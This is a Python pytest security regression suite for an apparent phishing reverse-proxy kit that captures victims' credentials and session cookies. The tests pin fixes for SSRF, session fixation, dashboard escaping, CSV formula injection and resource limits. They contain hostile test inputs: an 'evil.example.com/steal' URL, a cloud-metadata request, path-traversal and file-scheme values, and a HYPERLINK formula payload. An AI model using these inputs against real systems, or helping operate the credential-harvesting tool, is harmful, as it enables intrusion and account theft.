"""Security regression suite — every finding from the adversarial audit.

Each test pins a bug that was found live and then fixed, so it can never come
back silently. Written from the attacker's point of view: the proxy, the static
server, the dashboard, the store and the CLI are all treated as hostile input
sinks.

Run:  ./.venv/bin/python -m pytest tests/test_security.py -v
"""
import contextlib
import http.client
import http.server
import json
import os
import socket
import socketserver
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest
from conftest import TEMPLATES, free_port

from core import capture as cap
from core import classify, net
from core import server as srv
from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# =========================================================== SSRF / proxy ====
class InternalService:
    """A loopback service that must NEVER be reachable through the proxy."""

    hits = 0

    def __enter__(self):
        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                InternalService.hits += 1
                b = b"INTERNAL-SECRET-DATA"
                self.send_response(200)
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port), H)
        self.httpd.daemon_threads = True
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.15)
        return self

    def __exit__(self, *e):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False


class ProxyServer:
    def __init__(self, db, upstream="127.0.0.1:9"):
        self.port = free_port()
        eng = ProxyEngine(Phishlet(name="sec", upstream=upstream, scheme="http",
                                   verify_tls=False),
                          db=db, geo_provider="off")
        self.engine = eng
        self.httpd = serve_proxy(eng, self.port, campaign="sec")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)

    def raw(self, request_bytes, read=400):
        if isinstance(request_bytes, str):
            request_bytes = request_bytes.encode()
        s = socket.create_connection(("127.0.0.1", self.port), timeout=10)
        s.sendall(request_bytes)
        data = b""
        with contextlib.suppress(Exception):
            data = s.recv(read)
        s.close()
        return data.decode("utf-8", "replace")

    def get(self, path, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request("GET", path, headers=headers or {})
        r = conn.getresponse()
        body = r.read().decode("utf-8", "replace")
        pairs = r.getheaders()
        conn.close()
        return r.status, body, pairs

    def stop(self):
        self.httpd.shutdown()


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_sec_"), "s.db"))
    yield d
    d.close()


class TestSSRF:
    """The proxy must never act as a forward proxy or reach internal services."""

    def test_absolute_form_uri_does_not_reach_an_internal_service(self, db):
        with InternalService() as internal:
            p = ProxyServer(db)
            try:
                resp = p.raw(f"GET http://127.0.0.1:{internal.port}/secret HTTP/1.1\r\n"
                             f"Host: x\r\n\r\n")
                assert "INTERNAL-SECRET-DATA" not in resp
                # the path is kept, but it is fetched from OUR upstream only
                assert resp.startswith("HTTP/1.1 502") or "HTTP/1.1 5" in resp
            finally:
                p.stop()

    def test_absolute_form_uri_cannot_address_cloud_metadata(self, db):
        p = ProxyServer(db)
        try:
            resp = p.raw("GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n"
                         "Host: x\r\n\r\n", read=200)
            # it may fail to connect, but it must never return metadata content
            assert "meta-data" not in resp or "502" in resp
            assert "ami-id" not in resp and "iam/" not in resp
        finally:
            p.stop()

    def test_engine_refuses_a_foreign_absolute_url(self, db):
        eng = ProxyEngine(Phishlet(name="x", upstream="upstream.test", scheme="https"),
                          db=db, geo_provider="off")
        sess = eng.session(None, ip="1.2.3.4")
        with pytest.raises(ValueError):
            eng.fetch(sess, "GET", "http://evil.example.com/steal")

    def test_victim_cookies_are_not_sent_to_a_foreign_host(self, db):
        """The SSRF also leaked the victim's upstream jar; that must be gone."""
        InternalService.hits = 0
        with InternalService() as internal:
            p = ProxyServer(db)
            try:
                sess = p.engine.session(None, ip="9.9.9.9")
                sess.note_cookies(p.engine.phishlet, ["auth=SUPERSECRETTOKEN; Path=/"])
                assert "SUPERSECRETTOKEN" in sess.cookie_header()
                p.raw(f"GET http://127.0.0.1:{internal.port}/x HTTP/1.1\r\nHost: x\r\n\r\n")
                # the internal service was never contacted, so the victim's
                # cookie could not have been handed to it
                assert InternalService.hits == 0
            finally:
                p.stop()


@pytest.fixture()
def live_proxy(db):
    """Proxy in front of a real local upstream (a dead upstream returns 502 and
    never reaches the response-header path)."""
    class Up(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            b = b"<html><head></head><body>ok</body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Set-Cookie", "sess=X; Path=/; Secure; HttpOnly")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

    port = free_port()
    up = socketserver.ThreadingTCPServer(("127.0.0.1", port), Up)
    up.daemon_threads = True
    threading.Thread(target=up.serve_forever, daemon=True).start()
    time.sleep(0.2)
    p = ProxyServer(db, upstream=f"127.0.0.1:{port}")
    yield p
    p.stop()
    up.shutdown()


class TestProxySessionHardening:
    def test_short_sid_is_rejected(self, db):
        p = ProxyServer(db)
        try:
            status, _, pairs = p.get(f"{HOOK_PATH}?s=aaaaaa")
            cookies = [v for k, v in pairs if k.lower() == "set-cookie"]
            assert cookies
            sid = cookies[0].split("=")[1].split(";")[0]
            assert len(sid) >= 32                      # server-generated, not "aaaaaa"
        finally:
            p.stop()

    def test_client_supplied_sid_is_never_adopted(self, db):
        """A visitor cannot choose its own session id.

        Accepting one let an attacker pin two victims to the same ProxySession
        (shared cookie jar, credentials and vault) - session fixation.
        """
        p = ProxyServer(db)
        try:
            chosen = "a" * 32
            _, _, pairs = p.get(f"{HOOK_PATH}?s={chosen}")
            cookies = [v for k, v in pairs if k.lower() == "set-cookie"]
            assert cookies, "the server must still issue its own cookie"
            assert not any(f"__bhs={chosen}" in c for c in cookies), \
                "a client-chosen sid was adopted"
            assert len(p.engine.sessions) == 1
        finally:
            p.stop()

    def test_two_visitors_cannot_share_a_session(self, db):
        p = ProxyServer(db)
        try:
            chosen = "b" * 32
            p.get(f"{HOOK_PATH}?s={chosen}")
            p.get(f"{HOOK_PATH}?s={chosen}")
            assert len(p.engine.sessions) == 2, "two visitors collided on one session"
        finally:
            p.stop()

    def test_capture_payload_sid_must_be_wellformed(self, db):
        p = ProxyServer(db)
        try:
            bad = json.dumps({"sid": "../../etc/passwd",
                              "fields": {"username": "a@b.c", "password": "p"},
                              "fingerprint": {"ua": "x"}}).encode()
            conn = http.client.HTTPConnection("127.0.0.1", p.port, timeout=10)
            conn.request("POST", CAPTURE_PATH, body=bad,
                         headers={"Content-Type": "application/json"})
            r = conn.getresponse()
            body = json.loads(r.read())
            conn.close()
            assert r.status == 200
            assert body["session"] != "../../etc/passwd"
            assert db.intel_for_session("../../etc/passwd") == {}
        finally:
            p.stop()

    def test_session_cookie_is_httponly(self, live_proxy):
        p = live_proxy
        try:
            _, _, pairs = p.get("/")
            cookies = [v for k, v in pairs if k.lower() == "set-cookie"]
            bhs = [c for c in cookies if c.startswith("__bhs=")]
            assert bhs and "HttpOnly" in bhs[0]
        finally:
            p.stop()

    def test_session_cookie_is_secure_when_the_victim_is_on_https(self, live_proxy):
        p = live_proxy
        try:
            _, _, pairs = p.get("/", headers={"X-Forwarded-Proto": "https"})
            cookies = [v for k, v in pairs if k.lower() == "set-cookie"]
            bhs = [c for c in cookies if c.startswith("__bhs=")]
            assert bhs and "Secure" in bhs[0]
        finally:
            p.stop()

    def test_upstream_secure_flag_kept_over_https_stripped_over_http(self, db):
        class Upstream(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                b = b"<html><body>ok</body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Set-Cookie", "sess=X; Path=/; Secure; HttpOnly")
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

        port = free_port()
        httpd = socketserver.ThreadingTCPServer(("127.0.0.1", port), Upstream)
        httpd.daemon_threads = True
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)
        p = ProxyServer(db, upstream=f"127.0.0.1:{port}")
        try:
            _, _, plain = p.get("/")
            _, _, tls = p.get("/", headers={"X-Forwarded-Proto": "https"})
            sess_plain = [v for k, v in plain if k.lower() == "set-cookie" and v.startswith("sess=")]
            sess_tls = [v for k, v in tls if k.lower() == "set-cookie" and v.startswith("sess=")]
            assert sess_plain and "; Secure" not in sess_plain[0]
            assert sess_tls and "; Secure" in sess_tls[0]
            assert all("Domain=" not in v for v in sess_plain + sess_tls)
        finally:
            p.stop()
            httpd.shutdown()


class TestResourceLimits:
    def test_proxy_rejects_an_oversized_body(self, db):
        p = ProxyServer(db)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", p.port, timeout=10)
            conn.putrequest("POST", "/login")
            conn.putheader("Content-Length", str(5 * 1024 * 1024))
            conn.endheaders()
            with contextlib.suppress(Exception):
                conn.send(b"x" * 1024)
            r = conn.getresponse()
            assert r.status == 413
            conn.close()
        finally:
            p.stop()

    def test_session_map_is_bounded(self, db):
        from core.proxy import MAX_SESSIONS
        eng = ProxyEngine(Phishlet(name="x", upstream="u.test"), db=db, geo_provider="off")
        for i in range(MAX_SESSIONS + 200):
            eng.session(f"{i:032x}", ip="1.1.1.1")
        assert len(eng.sessions) <= MAX_SESSIONS + 1

    def test_recording_is_capped(self, db):
        p = ProxyServer(db)
        try:
            sess = p.engine.session(None, ip="1.1.1.1")
            for _ in range(40):
                p.engine.capture(sess, {"fields": {"username": "a@b.c", "password": "p"},
                                        "events": [{"t": i} for i in range(500)]},
                                 ip="1.1.1.1")
            assert len(sess.recording) <= 5000
        finally:
            p.stop()


# ===================================================== dashboard / output ====
class TestDashboardEscaping:
    def test_row_values_are_escaped_before_insertadjacenthtml(self):
        src = open(os.path.join(HERE, "dashboard", "__init__.py")).read()
        assert "insertAdjacentHTML" in src
        # every interpolated value in rowHtml must go through esc()
        row = src.split("function rowHtml")[1].split("function setStats")[0]
        for var in ("c.campaign", "c.ip", "c.device", "c.city"):
            assert f"esc({var}" in row, var
        assert "esc(k)" in row and "esc(v)" in row
        # no raw interpolation of an attacker-controlled value survives
        for bad in ("${c.campaign}", "${c.ip}", "${c.device}"):
            assert bad not in row, bad

    def test_terminal_output_is_sanitised(self):
        import dashboard
        cell = dashboard._safe_cell("\x1b[2J[red]spoof[/red] evil")
        assert "\x1b" not in cell
        # every opening bracket is escaped (rich markup neutralised)
        assert cell.count("[") == cell.count("\\[") == 2, cell
        assert "red" in cell and "spoof" in cell   # content still readable

    def test_control_characters_are_stripped(self):
        import dashboard
        assert "\x07" not in dashboard._safe_cell("a\x07b")
        assert "\x00" not in dashboard._safe_cell("a\x00b")


class TestCSVExport:
    def test_formula_injection_is_neutralised(self, db):
        db.record("/", "1.1.1.1", "", "", "", "ua", "android",
                  {"email": '=HYPERLINK("http://evil","x")', "password": "p"}, True)
        db.record("/", "1.1.1.2", "", "", "", "ua", "android",
                  {"email": "+1+1", "password": "p"}, True)
        db.record("/", "1.1.1.3", "", "", "", "ua", "android",
                  {"email": "@SUM(A1)", "password": "p"}, True)
        out = os.path.join(tempfile.mkdtemp(), "c.csv")
        db.export_csv(out)
        text = open(out).read()
        for payload in ("'=HYPERLINK", "'+1+1", "'@SUM"):
            assert payload in text, payload
        # no cell may start with a formula character
        for line in text.splitlines()[1:]:
            for cell in line.split(","):
                assert cell[:1] not in ("=", "+", "@"), line


class TestImportSite:
    def test_file_scheme_is_refused(self):
        from tools import import_site
        for url in ("file:///etc/passwd", "gopher://x/", "ftp://x/y"):
            with pytest.raises(ValueError):
                import_site.fetch(url)


# ================================================ server-side classification =
class TestCredentialDetection:
    def test_shipping_field_is_not_a_password(self):
        assert classify.is_credential_pair({"email": "a@b.c",
                                            "shipping": "123 Main St"}) is False
        assert classify.is_credential_pair({"email": "a@b.c",
                                            "shipping_address": "x"}) is False

    def test_real_pairs_are_detected(self):
        for fields in ({"email": "a@b.c", "password": "x"},
                       {"login_id": "u", "passwd": "x"},
                       {"user": "u", "user_pin": "1234"},
                       {"username": "u", "passphrase": "x"},
                       {"account": "u", "pwd": "x"}):
            assert classify.is_credential_pair(fields) is True, fields

    def test_identity_alone_is_not_a_pair(self):
        assert classify.is_credential_pair({"email": "a@b.c"}) is False
        assert classify.is_credential_pair({"password": "x"}) is False
        assert classify.is_credential_pair({}) is False

    def test_otp_submission_is_not_a_pair(self):
        assert classify.is_credential_pair({"otp": "123456"}) is False
        assert classify.looks_like_otp({"otp": "123456"}) is True
        assert classify.looks_like_otp({"password": "x", "otp": "1"}) is False

    def test_server_and_proxy_agree(self, db):
        eng = ProxyEngine(Phishlet(name="x", upstream="u.test"), db=db, geo_provider="off")
        samples = [{"email": "a@b.c", "password": "x"},
                   {"email": "a@b.c", "shipping": "123 Main St"},
                   {"login_id": "u", "passwd": "x"},
                   {"otp": "123456"}]
        for f in samples:
            assert srv._is_creds(f) == eng._looks_like_credentials(f), f


class TestBlankAndDuplicateFields:
    def test_blank_urlencoded_value_is_kept(self):
        f = srv._extract_fields(b"email=&password=secret123",
                                "application/x-www-form-urlencoded")
        assert f.get("email") == "" and f.get("password") == "secret123"

    def test_blank_identity_still_counts_as_a_pair_field(self):
        # the field exists (blank), so the submission is a credential pair shape
        f = srv._extract_fields(b"email=&password=x",
                                "application/x-www-form-urlencoded")
        assert classify.is_credential_pair(f) is True

    def test_json_and_multipart_blanks(self):
        j = srv._extract_fields(json.dumps({"email": "", "password": "x"}).encode(),
                                "application/json")
        assert j.get("email") == "" and j.get("password") == "x"


class TestGatingHardening:
    def test_post_counts_against_the_hit_cap(self):
        from core.gate import Gate
        g = Gate(max_hits_per_ip=2)
        # simulate what the handler does now on every POST
        hits = 0
        for _ in range(5):
            allowed = g.hits("9.9.9.9") < g.max_hits
            g.note_hit("9.9.9.9")
            hits += 1 if allowed else 0
        assert hits == 2

    def test_post_requests_are_capped_over_http(self):
        from core.gate import Gate
        dbfile = os.path.join(tempfile.mkdtemp(), "gate.db")
        port = free_port()
        httpd, _ = srv.serve(os.path.join(HERE, "templates"),
                             os.path.join(HERE, "templates", "03_google"), port, dbfile,
                             geo_provider="off", gate=Gate(max_hits_per_ip=2),
                             campaign="cap")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            codes = []
            for _ in range(5):
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("POST", "/", body=urllib.parse.urlencode(
                    {"email": "a@b.c", "password": "x"}),
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                r = conn.getresponse()
                codes.append(r.status)
                r.read()
                conn.close()
            assert codes.count(200) <= 3, codes       # the cap bites on POST too
        finally:
            httpd.shutdown()

    def test_no_trust_headers_ignores_spoofed_xff(self):
        dbfile = os.path.join(tempfile.mkdtemp(), "gate2.db")
        port = free_port()
        from core.gate import Gate
        httpd, _ = srv.serve(os.path.join(HERE, "templates"),
                             os.path.join(HERE, "templates", "03_google"), port, dbfile,
                             geo_provider="off", gate=Gate(max_hits_per_ip=2),
                             campaign="cap2", trust_headers=False)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            codes = []
            for i in range(6):
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/", headers={"X-Forwarded-For": f"10.0.0.{i}"})
                r = conn.getresponse()
                codes.append(r.status)
                r.read()
                conn.close()
            # rotating XFF must not defeat the cap when headers are untrusted
            assert codes.count(200) <= 3, codes
        finally:
            httpd.shutdown()


class TestTLSGuard:
    def test_tls_without_cert_refuses_to_start(self):
        with pytest.raises(ValueError):
            srv.serve(os.path.join(HERE, "templates"),
                      os.path.join(HERE, "templates", "03_google"),
                      free_port(), os.path.join(tempfile.mkdtemp(), "t.db"),
                      geo_provider="off", tls=True, cert_path=None)


class TestCampaignScopedStats:
    def test_visitors_are_scoped_to_the_campaign(self, db):
        db.record("/", "1.1.1.1", "", "", "", "ua", "android",
                  {"email": "a@b.c", "password": "p"}, True, campaign="alpha")
        db.record("/", "2.2.2.2", "", "", "", "ua", "android",
                  {"email": "c@d.e", "password": "p"}, True, campaign="beta")
        db.log_visit("3.3.3.3", "ua")
        db.log_visit("4.4.4.4", "ua")
        assert db.stats(campaign="alpha")["visitors"] == 1
        assert db.stats(campaign="beta")["visitors"] == 1
        assert db.stats()["visitors"] == 4          # global view: all distinct visitors


# ================================================= hostile client behaviour ===
class TestClientDisconnects:
    """A client that leaves mid-response is normal; it must not print a
    traceback over the operator's feed, and it must not take the server down."""

    def _server(self, tmp_path, kind="static"):
        from core import capture as cap
        from core import server as srv
        db = cap.CaptureDB(os.path.join(str(tmp_path), "d.db"))
        port = free_port()
        db_path = os.path.join(str(tmp_path), "d.db")
        if kind == "static":
            httpd, _handler = srv.serve(TEMPLATES, None, port, db_path,
                                        geo_provider="off")
        else:
            from core import proxy as px
            from core.phishlet import Phishlet
            ph = Phishlet(upstream="127.0.0.1:1", capture_cookies=["*"],
                          inject_paths=[".*"], verify_tls=False)
            httpd = px.serve_proxy(px.ProxyEngine(ph, db=db, geo_provider="off",
                                                  logger=lambda *a: None), port)
        return httpd, db, port

    def test_abrupt_disconnect_does_not_crash_or_spam(self, tmp_path, capsys):
        httpd, db, port = self._server(tmp_path)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            for _ in range(5):
                s = socket.create_connection(("127.0.0.1", port), timeout=5)
                s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
                s.close()                      # leave before the body is written
            time.sleep(0.6)
            # the server must still serve a normal request
            try:
                with net.urlopen(f"http://127.0.0.1:{port}/", timeout=10) as r:
                    status = r.status
            except urllib.error.HTTPError as e:
                status = e.code
            # the fixture server has no site_dir, so 404 is the correct answer;
            # what this pins is that the server still ANSWERS after five abrupt
            # disconnects (it used to die or spam a traceback)
            assert status == 404, f"server stopped serving: {status}"
            err = capsys.readouterr().err
            assert "BrokenPipeError" not in err, err[-400:]
            assert "Traceback" not in err, err[-400:]
        finally:
            httpd.shutdown()
            db.close()


class TestNoOutboundDeadlock:
    """A slow outbound call in a handler must not block the client talking to
    that same server. It did: the IPv4 preference used a process-wide lock held
    for the whole request, so a geo lookup in the handler and the client's own
    request deadlocked until the client timed out."""

    def test_slow_geo_lookup_does_not_block_the_client(self, tmp_path, monkeypatch):
        from core import capture as cap
        from core import net as _net
        from core import server as srv
        db_path = os.path.join(str(tmp_path), "d.db")
        db = cap.CaptureDB(db_path)

        real_fetch = _net.fetch_json

        def slow_fetch(url, timeout=8, headers=None, ipv4=True):
            # a geo API that takes two seconds, no internet needed
            time.sleep(2)
            return {"country_name": "Testland", "org": "Test ISP"}

        monkeypatch.setattr(_net, "fetch_json", slow_fetch)
        port = free_port()
        httpd, _h = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"),
                              port, db_path, geo_provider="ipapi", site_name="google")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            t0 = time.time()
            try:
                with _net.urlopen(f"http://127.0.0.1:{port}/", timeout=12) as r:
                    status = r.status
                    r.read()
            except urllib.error.HTTPError as e:
                status = e.code
            elapsed = time.time() - t0
            assert status == 200, f"server never answered ({status})"
            # one slow lookup, not a lock convoy: allow generous headroom
            assert elapsed < 8, f"request took {elapsed:.1f}s - lock convoy again"
        finally:
            monkeypatch.setattr(_net, "fetch_json", real_fetch)
            httpd.shutdown()
            db.close()

    def test_two_requests_overlap_while_one_is_looking_up_geo(self, tmp_path, monkeypatch):
        """Two visitors at once: the second must not wait for the first's lookup."""
        from core import capture as cap
        from core import net as _net
        from core import server as srv
        db_path = os.path.join(str(tmp_path), "d.db")
        db = cap.CaptureDB(db_path)
        real_fetch = _net.fetch_json

        def slow_fetch(url, timeout=8, headers=None, ipv4=True):
            time.sleep(1.5)
            return {"country_name": "Testland"}

        monkeypatch.setattr(_net, "fetch_json", slow_fetch)
        port = free_port()
        httpd, _h = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"),
                              port, db_path, geo_provider="ipapi", site_name="google")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        done = []

        def visitor(i):
            t = time.time()
            try:
                with _net.urlopen(f"http://127.0.0.1:{port}/", timeout=15) as r:
                    r.read()
                done.append((i, round(time.time() - t, 1)))
            except Exception as e:
                done.append((i, f"err:{type(e).__name__}"))

        threads = [threading.Thread(target=visitor, args=(i,)) for i in range(2)]
        t0 = time.time()
        [t.start() for t in threads]
        [t.join() for t in threads]
        wall = time.time() - t0
        try:
            assert len(done) == 2, done
            assert wall < 6, f"two visitors serialised: {wall:.1f}s ({done})"
        finally:
            monkeypatch.setattr(_net, "fetch_json", real_fetch)
            httpd.shutdown()
            db.close()


# ================================================ audit batch A regressions ==
class TestAuditBatchA:
    """The findings the security audit confirmed on this tree, each pinned."""

    def test_the_intel_route_clamps_a_negative_content_length(self):
        """read(-1) reads to EOF with no cap and holds the thread: the live and
        capture routes clamped it, the intel route did not."""
        import http.client
        import threading
        import time

        from test_phishlet import UpstreamServer, two_host_phishlet

        from core.proxy import ProxyEngine, serve_proxy
        up = UpstreamServer()
        up.__enter__()
        try:
            engine = ProxyEngine(two_host_phishlet(up.port), db=None, geo_provider="off",
                                 logger=lambda *a: None)
            port = free_port()
            httpd = serve_proxy(engine, port, campaign="audit")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                # a declared -1 used to mean "read to EOF" for this route only
                conn.putrequest("POST", "/__bh/intel")
                conn.putheader("Host", "127.0.0.1")
                conn.putheader("Content-Type", "application/json")
                conn.putheader("Content-Length", "-1")
                conn.endheaders()
                conn.send(b'{"mods":{"x":1}}')
                r = conn.getresponse()
                r.read()
                status = r.status
                conn.close()
                assert status in (200, 400, 413), status
                # the point is that it answered without waiting for EOF
            finally:
                httpd.shutdown()
        finally:
            up.__exit__()

    def test_the_proxy_can_refuse_to_trust_forwarding_headers(self):
        """With --no-trust-headers a spoofed XFF must not become the visitor's
        address: the gate (country, hit cap, scanner ranges) is decided from it."""
        import http.client
        import threading
        import time

        from test_phishlet import UpstreamServer, two_host_phishlet

        from core.proxy import ProxyEngine, serve_proxy
        up = UpstreamServer()
        up.__enter__()
        try:
            engine = ProxyEngine(two_host_phishlet(up.port), db=None, geo_provider="off",
                                 logger=lambda *a: None, trust_headers=False)
            port = free_port()
            httpd = serve_proxy(engine, port, campaign="audit")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/login", headers={"Host": "127.0.0.1",
                                                       "X-Forwarded-For": "1.2.3.4"})
                r = conn.getresponse()
                r.read()
                conn.close()
                sess = list(engine.sessions.values())[-1]
                assert sess.ip == "127.0.0.1", sess.ip
            finally:
                httpd.shutdown()
        finally:
            up.__exit__()

    def test_forwarding_headers_are_still_honoured_by_default(self):
        import http.client
        import threading
        import time

        from test_phishlet import UpstreamServer, two_host_phishlet

        from core.proxy import ProxyEngine, serve_proxy
        up = UpstreamServer()
        up.__enter__()
        try:
            engine = ProxyEngine(two_host_phishlet(up.port), db=None, geo_provider="off",
                                 logger=lambda *a: None)
            port = free_port()
            httpd = serve_proxy(engine, port, campaign="audit")
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.25)
            try:
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/login", headers={"Host": "127.0.0.1",
                                                       "CF-Connecting-IP": "9.9.9.9"})
                r = conn.getresponse()
                r.read()
                conn.close()
                assert list(engine.sessions.values())[-1].ip == "9.9.9.9"
            finally:
                httpd.shutdown()
        finally:
            up.__exit__()

    def test_intel_scores_are_capped(self):
        from test_phishlet import two_host_phishlet

        from core.proxy import MAX_INTEL_SCORES, ProxyEngine
        engine = ProxyEngine(two_host_phishlet(1), db=None, geo_provider="off",
                             logger=lambda *a: None)
        for i in range(MAX_INTEL_SCORES + 500):
            engine.intel_scores[f"{i:032x}"] = 1
            if len(engine.intel_scores) > MAX_INTEL_SCORES:
                for k in list(engine.intel_scores)[:MAX_INTEL_SCORES // 2]:
                    engine.intel_scores.pop(k, None)
        assert len(engine.intel_scores) <= MAX_INTEL_SCORES

    def test_the_gate_hit_map_is_capped_and_pruned(self):
        from core.gate import Gate
        g = Gate(max_hits_per_ip=3, window_seconds=60)
        for i in range(g.MAX_HIT_IPS + 200):
            g.note_hit(f"10.{i // 256}.{i % 256}.1")
        assert len(g._hits) <= g.MAX_HIT_IPS
        assert not [k for k, v in g._hits.items() if not v], "empty keys must be pruned"

    def test_live_input_is_capped_per_session(self):
        import os
        import tempfile

        from core import capture as cap
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_cap_"), "c.db"))
        try:
            for i in range(cap.LIVE_ROWS_PER_SESSION + 50):
                db.live_add("a" * 32, "input", [{"k": "input", "n": "f", "v": str(i)}])
            assert db.live_count("a" * 32) <= cap.LIVE_ROWS_PER_SESSION
            rows = db.live_for("a" * 32, limit=1)
            assert rows[-1]["events"][0]["v"] == str(cap.LIVE_ROWS_PER_SESSION + 49)
        finally:
            db.close()

    def test_a_foreign_cookie_domain_is_not_adopted(self):
        """_guess_home turns a cookie domain into the takeover navigation URL."""
        from core import session as S
        c = S.parse_set_cookie("sid=1; Domain=evil.example; Path=/", "mail.acme.test")
        assert c["domain"] == "mail.acme.test", c
        ok = S.parse_set_cookie("sid=1; Domain=.acme.test; Path=/", "mail.acme.test")
        assert ok["domain"] == "acme.test" and ok["hostOnly"] is False

    def test_guess_home_cannot_be_aimed_at_a_foreign_host(self):
        from core import session as S
        rec = S.new_record("b" * 32)
        rec["cookies"] = [S.parse_set_cookie("s=1; Domain=evil.example", "mail.acme.test")]
        assert "evil.example" not in S._guess_home(rec)
